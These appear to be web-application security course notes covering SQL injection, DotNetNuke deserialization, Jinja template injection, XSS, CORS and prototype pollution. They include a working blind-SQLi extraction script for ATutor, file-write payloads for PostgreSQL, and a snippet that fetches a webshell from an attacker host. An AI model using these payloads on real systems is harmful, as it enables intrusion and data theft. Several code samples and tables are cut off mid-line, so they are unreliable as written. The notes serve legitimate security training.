1. Tools and Methodologies

Web application research can be conducted from a whitebox (full source code access), blackbox (no source, observe behavior only), or greybox (partial access such as credentials or documentation) perspective. Whitebox assessments of interpreted or bytecode-based languages (Java, .NET) are particularly effective because source code can be trivially recovered via decompilation. Regardless of approach, the workflow follows the same core loop: inspect traffic, recover source, analyze code, debug, and exploit.

1.1 Web Traffic Inspection

Start with traffic inspection. A web proxy captures client requests and server responses for precise HTTP manipulation. Burp Suite Community Edition handles information gathering and request manipulation.

1.1.1 Burp Suite Proxy

Burp Suite includes an embedded Chromium browser preconfigured to proxy traffic through its listener on 127.0.0.1:8080. Launch it from the Proxy > Intercept tab by clicking Open Browser. The Intercept feature captures requests before forwarding or dropping them. Toggle it on/off as needed.

The HTTP history tab logs every request and response that passed through Burp Suite.

1.1.2 Using Burp with Other Browsers

To configure Firefox manually, navigate to about:preferences#advanced, scroll to Network Settings, click Settings, and choose Manual proxy configuration. Set the HTTP proxy to 127.0.0.1 port 8080 and check "Use this proxy server for all protocols."

While Burp is configured as a proxy, all browser traffic routes through it. To stop proxying, switch back to "Use system proxy settings" or use a browser extension like FoxyProxy to toggle between proxy profiles.

1.1.3 Scope and Filtering

Right-click any request in HTTP history and select Add to scope to filter irrelevant traffic. Adding a top-level domain URL includes the entire domain. After setting scope, Burp offers to stop capturing out-of-scope items.

Enable "Show only in-scope items" in the HTTP history filter bar to reduce noise from third-party requests, ad networks, and browser auto-updates. Verify scope configuration under Target > Scope.

1.1.4 Repeater and Comparer

The Repeater tool resends captured requests with arbitrary modifications. Right-click a request in HTTP history and select Send to Repeater. Send the unmodified request first to establish a baseline response, then make changes (e.g., adding an Origin header) and observe how the response differs.

To compare responses, right-click each response and select Send to Comparer. The Comparer tab offers Words and Bytes comparison modes with color-coded highlighting: Modified, Deleted, and Added.

1.1.5 Decoder

The Inspector tool auto-detects encoding when you select text in the HTTP history tab. For example, selecting dGVzdDp0ZXN0 from a Basic auth header reveals the decoded value test:test. The dedicated Decoder tab provides full encode, decode, and hash capabilities for more complex transformations.

Right-click encoded text and select Send to Decoder, then choose the encoding scheme (Base64, URL, HTML, hex, etc.) from the Decode as dropdown. Multiple decode/encode operations can be chained.

1.3 Source Code Recovery

Java and .NET applications compile to bytecode that decompiles back to near-original source code.

1.3.1 .NET Decompilation with dnSpy

dnSpy uses the ILSpy decompiler engine to extract source code from compiled .NET assemblies. It supports both decompilation and debugging, making it the primary tool for .NET analysis. Open a DLL or EXE by dragging it onto the dnSpy window, and it reconstructs near-original C# source including classes, methods, and data types.

1.4 Source Code Analysis Methodology

Walk through the application in a browser with Burp Suite proxying traffic first. Note the technologies in use, how routes are mapped, and how data flows - this narrows focus during source review.

1.4.1 Approach to Analysis

Data enters an application through a source (e.g., HTTP request handler) and is operated on at a sink (e.g., database query, system command). Manual source code analysis involves tracing the path between these two points and identifying where input validation or sanitization is absent.

ApproachStart PointDirectionTypical Findings
Top-downSources (entry points, request handlers)Trace forward to sinksLower-severity, higher-exposure (e.g., XSS)
Bottom-upSinks (dangerous functions)Trace backward to sourcesHigher-severity, lower-exposure (e.g., RCE via admin function)

Adapt both approaches as needed. The goal is always the same: find the vulnerability, reach the vulnerable code, and bypass any restrictions.

1.4.2 Using an IDE

Visual Studio Code supports multiple programming languages via extensions and provides advanced code search and debugging. Use the Toggle Search Details button (three dots) to refine searches by file type. For example, entering *.java in the "files to include" field limits results to Java source files.

Right-click any function or method name and select Find All References to locate all call sites. Search for unique keywords from application pages, error messages, and HTTP responses to narrow down relevant code paths. Regular expressions in VS Code searches help locate complex patterns like SQL query construction.

1.5 Debugging

A debugger exposes memory contents, call stacks, and variable values at runtime. Pair remote debugging with database query logging for full visibility into application behavior.

2.2 Initial Vulnerability Discovery

ATutor's search functionality accepts user input and passes it to MySQL queries. The search handler is located in mods/_standard/social/index_public.php. The search parameter flows into a SQL query without proper sanitization.

// mods/_standard/social/index_public.php
$search = $_GET['search'];
// The search value is used in a LIKE clause
$sql = "SELECT * FROM " . TABLE_PREFIX . "members WHERE login LIKE '%$search%'";

PHP's addslashes() function is applied to some inputs, but the search parameter bypasses this protection because it is used inside a LIKE clause where addslashes() does not prevent injection. The % wildcard characters are not escaped, and certain injection payloads avoid the need for single quotes entirely.

addslashes()Single quotes, double quotes, backslashes, NULL bytesDoes not escape % or _ wildcards; charset-dependent bypass possible
mysql_real_escape_string()Same as addslashes plus charset-awareStill vulnerable if not inside quotes in the query
Parameterized queriesFull separation of SQL and dataNone (correct approach)

# Baseline request (normal search)

2.3 Blind SQL Injection Techniques

A blind SQL injection occurs when the application does not display query results or error messages directly, but the injected condition influences the response in a detectable way. ATutor's search returns different HTML content depending on whether the injected boolean condition evaluates to true or false.

TechniqueDetection MethodSpeed
Boolean-based blindCompare response content length or specific HTML elementsModerate (1 bit per request)
Time-based blindMeasure response delay using SLEEP() or BENCHMARK()Slow (wait per character)
Error-basedExtract data through database error messagesFast (direct output)
UNION-basedAppend attacker query results to normal outputFastest (full rows per request)

For boolean-based extraction, the SUBSTRING() function isolates individual characters, and ASCII() converts them to numeric values for comparison:

-- Extract first character of database version
' AND ASCII(SUBSTRING(@@version,1,1)) > 53--+-

-- Binary search: narrow down ASCII value
' AND ASCII(SUBSTRING(@@version,1,1)) > 53--+-   -- Is char > '5'?
' AND ASCII(SUBSTRING(@@version,1,1)) > 52--+-   -- Is char > '4'?
' AND ASCII(SUBSTRING(@@version,1,1)) = 53--+-   -- Is char == '5'?

A binary search over the ASCII range (32-126) requires at most 7 requests per character, compared to 94 requests for a linear scan.

2.4 Digging Deeper

2.4.1 addslashes() Limitations

PHP's addslashes() escapes single quotes by prepending a backslash (\'). However, in multi-byte character sets (e.g., GBK, SJIS), a specially crafted byte sequence can consume the backslash as part of a valid multi-byte character, leaving the single quote unescaped.

// addslashes() behavior:
$input = "test'";
echo addslashes($input);  // Output: test\'

// Multi-byte bypass (GBK charset):
// 0xbf5c is a valid GBK character
// 0xbf27 → addslashes → 0xbf5c27 → GBK char + unescaped quote
$input = "\xbf\x27";
echo addslashes($input);  // Output: 0xbf 0x5c 0x27 → [valid GBK char]'

Even without multi-byte bypass, addslashes() fails when the user input is used as a numeric value (without quotes in the SQL query). In that case, no quote is needed for injection:

// Vulnerable: numeric context, no quotes around $id
$sql = "SELECT * FROM users WHERE id = " . addslashes($id);
// Injection: id=1 OR 1=1 (no quotes needed, addslashes is irrelevant)

2.4.2 Improper Use of Parameterization

$stmt->execute();

// SECURE: proper parameterized query
$stmt = $db->prepare("SELECT * FROM members WHERE login = ?");
$stmt->bind_param("s", $_GET['user']);

2.5.2 MySQL Version Extraction

With the boolean oracle confirmed, extract the MySQL version string character by character using binary search:

import requests

target = "http://[target-ip]/[application-path]"
search_url = f"{target}/mods/_standard/social/index_public.php"

def inject(payload):
    r = requests.get(search_url, params={"search": payload})
    return "Member Results" in r.text

def extract_char(position, query):
    """Binary search for a single character at the given position."""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        sqli = f"test' AND ASCII(SUBSTRING(({query}),{position},1)) > {mid}--+-"
        if inject(sqli):
            low = mid + 1
        else:
            high = mid
    return chr(low) if low > 32 else None

def extract_string(query, max_len=64):
    """Extract a full string from a subquery."""
    result = ""
    for i in range(1, max_len + 1):
        c = extract_char(i, query)
        if c is None:
            break
        result += c
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result

# Extract MySQL version
version = extract_string("SELECT @@version")
print(f"[+] MySQL Version: {version}")

# Extract current database name
db_name = extract_string("SELECT database()")
print(f"[+] Database: {db_name}")

# Extract current user
db_user = extract_string("SELECT user()")
print(f"[+] User: {db_user}")

3.2 PHP Loose and Strict Comparisons

PHP has two comparison operators: loose (==) and strict (===). Loose comparison performs type coercion before comparing values, which can produce unexpected results when comparing strings that look like numbers.

4.4 Bypassing Character Restrictions

4.4.1 HTML Encoding Problem

Special characters in the HTTP request are HTML-encoded before reaching the database. A single quote (') becomes &#39, breaking quoted string literals in SQL. MySQL supports hex-encoded strings (0x...) as a bypass, but PostgreSQL does not auto-decode hex literals.

-- Injecting a single quote results in HTML encoding:
-- STATEMENT: ... where USERID=1&#39
-- ERROR: operator does not exist: integer &# integer

-- PostgreSQL decode() still requires quotes:
SELECT convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
-- Not usable because quotes are encoded

4.4.2 Using CHR() and String Concatenation

The CHR() function converts ASCII code points to characters. The double pipe (||) operator concatenates them. This works for basic queries like SELECT and INSERT but fails for function arguments such as the filename parameter in COPY.

-- Build strings from character codes:
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
-- Returns: AWAE

-- Works in INSERT VALUES:
CREATE TABLE test (col text);
INSERT INTO test(col) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));

-- Does NOT work for COPY TO filename argument:
COPY test(col) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65);
-- ERROR: syntax error at or near "CHR"

4.4.3 Dollar-Quoted String Constants

PostgreSQL supports dollar-quoted string constants as a quote substitute. Two dollar signs ($$) function identically to single quotes, and an optional tag ($TAG$) can be used. This fully bypasses the HTML encoding restriction on single quotes.

-- All three statements are equivalent:
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;

-- Dollar-quoting bypasses the restriction for COPY TO:
CREATE TEMP TABLE test(col text);
INSERT INTO test(col) VALUES ($$payload_data$$);
COPY test(col) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;

4.7 Large Objects for File Transfer

4.7.1 Large Object Mechanics

The remote SMB approach requires internal network access. For scenarios without SMB connectivity, PostgreSQL Large Objects provide an alternative to transfer binary files directly through SQL queries. Unlike COPY TO, Large Objects can faithfully reproduce binary data when exported.

Large objects are stored in the pg_largeobject table, split into 2KB (2048 byte) pages. The lo_import function creates a large object with a specified loid (allowing us to reference it in blind injection), and lo_export writes it back to the filesystem.

-- Create a large object with a known loid:
SELECT lo_import($$C:\\Windows\\win.ini$$, 1337);

-- View the stored data:
SELECT loid, pageno, encode(data, 'escape') FROM pg_largeobject;

-- Update the data with custom hex-encoded content:
UPDATE pg_largeobject SET data=decode($$77303074$$, $$hex$$)
    WHERE loid=1337 AND pageno=0;

-- Export the large object to a file:
SELECT lo_export(1337, $$C:\\new_file.dll$$);

-- Cleanup:
SELECT lo_unlink(1337);

5.2.1 Route Configuration

Hapi.js routes are declared with a method, path, and handler function. Plugins extend the server by registering additional routes, authentication strategies, or request lifecycle hooks.

5.4 Vulnerability Discovery

The vulnerability is in the reference resolution logic within internals.batch(). When a request path contains a $N reference, Bassmaster splits the reference on . and iterates through the parts to resolve the property chain. The resolution uses eval() to dereference each path segment.

// Vulnerable reference resolution in lib/batch.js (bassmaster <= 1.5.1)
internals.batch = function (request, settings, reply) {

    var resultsData = [];

    var requests = request.payload.requests;

    // Process each request sequentially
    Async.forEachSeries(requests, function (requestParts, next) {

        var path = requestParts.path;

        // Check for $N references in the path
        var parts = path.match(/\$(\d)+/g);

        if (parts) {
            for (var i = 0; i < parts.length; i++) {
                var ref = resultsData[parts[i].substring(1)];  // Get referenced result

                // VULNERABLE: eval() used to resolve property path
                var value = eval('ref.' + path.split('$' + parts[i].substring(1) + '.')[1]);

                path = path.replace('$' + parts[i].substring(1) + '.' +
                    path.split('$' + parts[i].substring(1) + '.')[1], value);
            }
        }

        // Dispatch the resolved request internally
        // ...
    });
};

The vulnerable line is eval('ref.' + parts[i]). The parts[i] variable comes directly from the user-supplied path string after splitting on $N.. No sanitization, allowlist, or sandboxing is applied before passing the string to eval().

6.1 Serialization Basics

Serialization converts an object's state into a format that can be stored or transmitted over a network. Deserialization reconstructs the object from that format. When an application deserializes untrusted data without type validation, an attacker can inject malicious objects that execute code during reconstruction.

.NET supports multiple serialization mechanisms including BinaryFormatter, XmlSerializer, and DataContractSerializer. This module focuses on XmlSerializer as it directly relates to the DotNetNuke vulnerability (CVE-2017-9822).

DNN Webhttp://[target-hostname]/[application-path][username][password]

6.1.1 XmlSerializer Limitations

XmlSerializer can only serialize public properties and fields of an object. It cannot serialize abstract classes, and the type of the object being serialized must always be known to the XmlSerializer instance at runtime.

LimitationImplication
Public properties/fields onlyPrivate members are ignored during serialization
No abstract classesOnly concrete types can be serialized
Type must be known at runtimeUnknown types cause InvalidOperationException
No method serializationOnly properties/fields, not method calls, are serialized

6.1.2 Basic XmlSerializer Example

A serializer application creates an object, sets a property, and writes the XML representation to disk. The deserializer reads that XML and reconstructs the object. Property setters execute automatically during deserialization.

6.1.3 Expanded XmlSerializer (Dynamic Type Resolution)

A more flexible pattern stores the object type in an XML attribute so the deserializer can resolve it dynamically at runtime. The serializer writes the assembly-qualified type name into an objectType attribute on an item element.

// Serializer: stores type info in XML
static void CustomSerializer(Object myObj)
{
    XmlDocument xmlDocument = new XmlDocument();
    XmlElement xmlElement = xmlDocument.CreateElement("customRootNode");
    xmlDocument.AppendChild(xmlElement);
    XmlElement xmlElement2 = xmlDocument.CreateElement("item");
    xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
    XmlDocument xmlDocument2 = new XmlDocument();
    XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType());
    StringWriter writer = new StringWriter();
    xmlSerializer.Serialize(writer, myObj);
    xmlDocument2.LoadXml(writer.ToString());
    xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
    xmlElement.AppendChild(xmlElement2);
    File.WriteAllText("C:\\Users\\Public\\multiXML.txt", xmlDocument.OuterXml);
}

The deserializer reads the objectType attribute and uses Type.GetType() to dynamically create the XmlSerializer. An attacker who controls the XML can change the type to deserialize a completely different class.

// Deserializer: resolves type dynamically from XML
static void CustomDeserializer(String myXMLString)
{
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(myXMLString);
    foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
    {
        string typeName = xmlItem.GetAttribute("objectType");
        var xser = new XmlSerializer(Type.GetType(typeName));
        var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
        xser.Deserialize(reader);
    }
}

6.2 DotNetNuke Vulnerability Analysis

6.2.1 Vulnerability Overview

The DNNPersonalization cookie contains XML-serialized user profile data. DotNetNuke deserializes this cookie without validating the object types, creating an insecure deserialization vulnerability (CVE-2017-9822) exploitable without authentication.

The entry point is the LoadProfile function in DotNetNuke.Services.Personalization.PersonalizationController. At line 24, it checks for the DNNPersonalization cookie. Line 26 assigns the cookie value to a local variable. Line 29 passes that value to DeserializeHashTableXml.

6.2.2 Cookie Processing Flow

The deserialization chain passes through three functions before reaching the vulnerable XmlSerializer call. No type checking is performed at any point in this chain.

StepFunctionAction

2DeserializeHashTableXmlWrapper; hardcodes "profile" as root node name
3DeSerializeHashtableIterates profile/item nodes, extracts type attribute, creates XmlSerializer, deserializes

The DeSerializeHashtable function performs the critical operations: it looks for every item node under the profile root tag (line 156), extracts the type from the type attribute (line 160), creates a new XmlSerializer with that type (line 161), and deserializes the user-controlled content (line 163).

6.2.3 Unauthenticated Access Mechanics

Requesting a nonexistent page triggers the AdvancedUrlReWriter.Handle404OrException handler. If HttpContext.User is null, it gets assigned Thread.CurrentPrincipal (the IIS APPPOOL identity), causing the request to be treated as authenticated.

This allows the code to reach PortalSettings.UserMode getter (line 922), which checks HttpContext.Current.Request.IsAuthenticated. Since the 404 handler set User to the Windows principal, IsAuthenticated returns true, and the LoadProfile personalization code path executes.

6.3.1 FileSystemUtils.PullFile

The FileSystemUtils class in DotNetNuke.dll implements a PullFile method that downloads a file from a URL to the target server filesystem. This is a useful primitive for uploading a webshell.

However, FileSystemUtils cannot be used directly as a deserialization payload. XmlSerializer can only serialize public properties and fields, not methods. FileSystemUtils has no public properties that trigger PullFile when set, so a different approach is needed.

6.3.2 ObjectDataProvider Class

The ObjectDataProvider class (in System.Windows.Data, PresentationFramework.dll) wraps an arbitrary object and calls a specified method when its properties are set. Setting the MethodName property triggers method invocation through a chain of internal calls.

2Refresh()Calls BeginQuery()
3BeginQuery()Overridden in ObjectDataProvider, calls QueryWorker()

// ObjectDataProvider triggers PullFile through property setters
ObjectDataProvider myODP = new ObjectDataProvider();

myODP.MethodParameters.Add("http://[attacker-ip]/shell.aspx");

ObjectDataProvider does not violate any XmlSerializer limitations - all the critical values (ObjectInstance, MethodName, MethodParameters) are public properties. The InvokeMethodOnInstance breakpoint is hit three times: once for MethodName and once for each MethodParameters.Add call.

Directly serializing an ObjectDataProvider wrapping FileSystemUtils via DNN's SerializeDictionary function fails. The XmlSerializer is instantiated using GetType() on the ObjectDataProvider, so it has no knowledge of the wrapped FileSystemUtils type.

7.3 Frappe Framework HTTP Routing

Frappe exposes Python functions as HTTP API endpoints using the @frappe.whitelist() decorator. The client calls functions via /api/method/[dotted.path.to.function], and Frappe maps the dotted path directly to the filesystem to locate and execute the function. Functions decorated with allow_guest=True are accessible without authentication.

7.3.1 The Whitelist Decorator

# apps/frappe/frappe/__init__.py - whitelist decorator
whitelisted = []
guest_methods = []
xss_safe_methods = []

def whitelist(allow_guest=False, xss_safe=False):
    """
    Decorator for whitelisting a function and making it accessible via HTTP.
    Standard request will be `/api/method/[path.to.method]`

    :param allow_guest: Allow non logged-in user to access this method.
    """
    def innerfn(fn):
        global whitelisted, guest_methods, xss_safe_methods
        whitelisted.append(fn)

        if allow_guest:
            guest_methods.append(fn)

            if xss_safe:
                xss_safe_methods.append(fn)

        return fn

    return innerfn

7.5 Server-Side Template Injection

After gaining administrator access via the SQL injection, remote code execution is possible through Jinja2 Server-Side Template Injection. Frappe uses Jinja extensively, and ERPNext exposes email template functionality that renders user-controlled content through Jinja.

7.5.1 Jinja2 Templating Basics

Jinja uses {{ }} delimiters for expressions (which produce a value) and {% %} for statements (which perform actions like variable assignment or loops). While Jinja has its own syntax, the underlying engine is Python, meaning template escapes can potentially access Python built-ins.

DelimiterTypeExample
{{ }}Expression (outputs value){{ 7*7 }} → 49
{% %}Statement (action){% set x = 42 %}
|Filter (pipe to function){{ "hello"|length }} → 5

7.5.2 The Classic SSTI Payload

The classic Jinja2 SSTI payload uses Python's Method Resolution Order (__mro__) to traverse the class hierarchy from a string object up to the base object class, then lists all subclasses to find one that enables code execution (such as file in Python 2 or subprocess.Popen in Python 3).

def render_template(template, context, is_path=None, safe_render=True):
    from frappe import get_traceback, throw
    from jinja2 import TemplateError

    if not template:
        return ""

    if (is_path
            or template.startswith("templates/")
            or (template.endswith('.html') and '\n' not in template)):
        return get_jenv().get_template(template).render(context)
    else:
        if safe_render and ".__" in template:
            throw("Illegal template")
        try:
            return get_jenv().from_string(template).render(context)
        except TemplateError:
            throw(title="Jinja Template Error",
                msg="<pre>{template}</pre><pre>{tb}</pre>".format(

9.3 DOM-Based XSS

The Document Object Model (DOM) is a hierarchical tree of objects representing HTML elements created by the browser's rendering engine. JavaScript manipulates the DOM via the Document interface using methods like getElementById, getElementsByTagName, and properties like innerHTML.

DOM-based XSS occurs when unsanitized user input is passed to a DOM manipulation sink like innerHTML or document.write(). Unlike reflected or stored XSS, the payload never reaches the server - it is processed entirely in the client's browser.

// Example DOM XSS - user input flows directly into document.write()
<!DOCTYPE html>
<html>
<head>
  <script>
    const queryString = location.search;
    const urlParams = new URLSearchParams(queryString);
    const name = urlParams.get('name');
    document.write('<h1>Hello, ' + name + '!</h1>');
  </script>
</head>
</html>

// Benign:  ?name=Jimmy           → "Hello, Jimmy!"
// Malicious: ?name=<script>alert(1)</script>  → XSS triggered

If such a file is hosted on a server, the vulnerability is classified as reflected DOM-based XSS. The static HTML files in vendor libraries cannot produce traditional reflected or stored XSS since the server doesn't dynamically generate them, but they may contain JavaScript that reads from the URL and writes to the DOM.

9.4 Advanced XSS Exploitation

A basic alert box proves the vulnerability but does not advance exploitation. The next step is escalating access through an authenticated victim's session.

9.4.1 Capabilities and Limitations

The session cookie itnovum has the HttpOnly flag set, preventing JavaScript from reading it directly. However, the browser still includes the cookie in all same-origin requests triggered by JavaScript (XHR/fetch), so XHR and fetch calls ride the victim's session to reach authenticated content.

10.2.2 Same-Origin Policy (SOP)

Browsers enforce the Same-Origin Policy to prevent one origin from reading resources loaded from a different origin. An origin is defined by scheme, hostname, and port. SOP does not prevent a request from being sent - it prevents JavaScript from reading the response.

URL (from https://a.com/latest)ResultReason
https://a.com/myInfoAllowedSame Origin
http://a.com/users.jsonBlockedDifferent Scheme and Port
https://api.a.com/infoBlockedDifferent Domain
https://a.com:8443/filesBlockedDifferent Port
https://b.com/analyticsBlockedDifferent Domain

JavaScript's fetch() API demonstrates this. A same-origin request succeeds and the response is readable, while a cross-origin request is sent but the browser blocks JavaScript from accessing the response body.

// Same-origin request - response readable

    .then(function (response) { return response.text(); })
    .then(function (text) { console.log(text); })

// Cross-origin request - blocked by SOP
fetch("http://example.com")
    .then(function (response) { return response.text(); })
    .then(function (text) { console.log(text); })

10.2.3 Cross-Origin Resource Sharing (CORS)

CORS relaxes SOP by instructing the browser (via response headers) which origins may access resources. The key headers are:

HeaderPurpose
Access-Control-Allow-OriginSpecifies which origin can read the response (*, a single origin, or null)
Access-Control-Allow-CredentialsWhen true, the browser sends cookies with cross-origin requests
Access-Control-Expose-HeadersLists response headers exposed to JavaScript

When Access-Control-Allow-Origin is set to *, Access-Control-Allow-Credentials must be false, so all cross-origin requests are unauthenticated. Because Allow-Origin only accepts a single value, developers often dynamically reflect the request's Origin header - a pattern that is inherently insecure when paired with Allow-Credentials: true.

10.2.4 Preflight Requests

Standard GET, HEAD, and POST requests (with standard content types) do not require a preflight check. However, requests using non-standard HTTP methods, custom headers, or non-standard content types (anything other than application/x-www-form-urlencoded, multipart/form-data, or text/plain) trigger an OPTIONS preflight request. The server must respond with appropriate CORS headers for the actual request to proceed.

// Standard POST - no preflight, request is sent
fetch("https://example.com", {
    method: 'post',
    headers: { "Content-type": "application/x-www-form-urlencoded;" }
})

// Non-standard content type - triggers OPTIONS preflight
fetch("https://example.com", {
    method: 'post',
    headers: { "Content-type": "application/json;" }
})

10.2.5 SameSite Cookie Attribute

The SameSite attribute on Set-Cookie controls whether cookies are sent on cross-site requests. It accepts three values:

ValueBehavior
StrictCookies only sent on same-site requests (not even on navigation links)
LaxCookies sent on top-level navigation with safe methods (GET, HEAD, OPTIONS) - default in Chrome 80+ and Edge 86+
NoneCookies sent in all contexts (requires the Secure attribute)

If a site does not set the SameSite attribute, the browser's default applies. Chrome defaults to Lax, while Firefox and Safari default to None. When the default is None, cross-origin requests include cookies, enabling CSRF if the application lacks additional protections like CSRF tokens.

10.2.6 Discovering Unsafe CORS in Concord

The /api/service/console/whoami endpoint returns Access-Control-Allow-Origin: * when no Origin header is present. When an Origin header is added, the server reflects it into Access-Control-Allow-Origin and adds Access-Control-Allow-Credentials: true.

However, when the request method is changed to OPTIONS, the origin is not reflected. This means the CORS vulnerability is limited to GET requests and standard POST requests (those that do not trigger a preflight). Non-standard POST requests (e.g., application/json) will be blocked by the preflight check.

12.3 JavaScript Prototype Fundamentals

Nearly everything in JavaScript is an object - arrays, browser APIs, and functions. The only exceptions are null, undefined, strings, numbers, booleans, and symbols. Unlike class-based languages, JavaScript uses prototypal inheritance where objects inherit directly from other objects.

12.3.1 Prototype Chain

Every object has a private __proto__ property linking to its prototype. Property lookups walk this chain until reaching Object.prototype (which has null as its prototype). The class keyword in ES2015 is syntactic sugar for constructor functions - both create objects via new.

// Constructor function (pre-ES2015 pattern)
function Student() {
    this.id = 2;
    this.enrolled = false;
}

Student.prototype.isActive = function() {
    console.log("Checking if active");
    return this.enrolled;
};

s = new Student();
// Student { id: 2, enrolled: false }

s.isActive();
// Checking if active
// false

typeof s;        // 'object'
typeof Student;  // 'function'

// __proto__ links to the constructor's prototype
s.__proto__ === Student.prototype;  // true

The prototype property belongs to constructor functions and defines the template for inherited methods. The __proto__ property is the actual link in the prototype chain. When new Student() executes, the engine creates an empty object, sets its __proto__ to Student.prototype, then runs the constructor with this bound to the new object.

12.3.2 Chain Resolution and Override

// The chain resolves the FIRST match found
s.isActive();  // Uses Student.prototype.isActive

// Override at the object level - shadows the prototype
s.isActive = function() {
    console.log("New isActive");
    return true;
};
s.isActive();
// New isActive
// true

// Prototype version still exists
s.__proto__.isActive();
// Checking if active
// undefined

// Delete override - chain falls back to prototype
delete s.isActive;
s.isActive();
// Checking if active
// false

12.3.3 Object.prototype Affects Everything

// Modifying Object.prototype pollutes ALL objects
Object.prototype.toString = function() {
    console.log("in Object prototype");
    return this.id.toString();
};

// After deleting overrides in the chain:
delete s.toString;
delete Student.prototype.toString;
s.toString();
// in Object prototype
// '2'

// Even blank objects are affected
{}.toString();
// in Object prototype
// TypeError: Cannot read property 'toString' of undefined
// (blank object has no .id - but the polluted function still ran)

Changes to Object.prototype persist until the Node.js process restarts. In web applications, once the prototype is polluted it affects all subsequent requests until reboot.

12.4 Vulnerable Merge Functions

Prototype pollution most commonly occurs in recursive merge or extend functions. These iterate over object keys and recursively merge nested objects. When user-controlled input contains __proto__ as a key, the merge walks into the prototype chain and injects properties into Object.prototype.

12.4.1 Vulnerable Pattern

function merge(a, b) {
    for (var key in b) {
        if (isObject(a[key]) && isObject(b[key])) {
            merge(a[key], b[key]);
        } else {
            a[key] = b[key];
        }
    }
    return a;
}

// Normal merge
x = { hello: "world" };
y = { foo: { bar: "foobar" } };
merge(x, y);
// { hello: 'world', foo: { bar: 'foobar' } }

// Pollution via __proto__
x = { hello: "world" };
y = { ["__proto__"]: { polluted: "yes" } };
merge(x, y);
// { hello: 'world' }  - looks normal, but:

{}.polluted;
// 'yes'  - ALL objects now have .polluted!

Square brackets around __proto__ make the property enumerable in the for...in loop. When the merge function hits __proto__, a["__proto__"] resolves to the prototype link (always an object), so the recursive branch fires and writes nested properties directly into Object.prototype.

// This merge is NOT vulnerable - no recursion

    for (var key in b) {
